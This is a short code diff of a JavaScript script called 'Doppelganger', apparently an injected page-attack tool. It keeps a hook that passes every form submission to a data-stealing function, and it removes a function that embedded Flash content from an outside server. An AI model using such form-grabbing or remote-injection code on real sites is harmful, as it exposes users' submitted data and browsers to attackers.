@@ -29,8 +29,7 @@ function initialize_doppelganger()
 {
 	//display_calling_card();
 	//form_steal();
-	flash_inject();
-	//alert("Doppelganger running!");
+	alert("Doppelganger running!");
 }
 
 function display_calling_card()
@@ -55,16 +54,6 @@ function steal_form_data(form)
 function form_steal()
 {
 	$jDoppelganger('form').bind('submit', function(e) { steal_form_data(this); });
-}
-
-function flash_inject()
-{
-	$jDoppelganger("body").flashembed(httpServer + "/flash/demo.swf");
-	//var flash_applet = httpServer + "/flash/flash.swf";		
-}
-
-function break_fixit()
-{
 }
 
 $jDoppelganger(document).ready(function() { initialize_doppelganger(); });
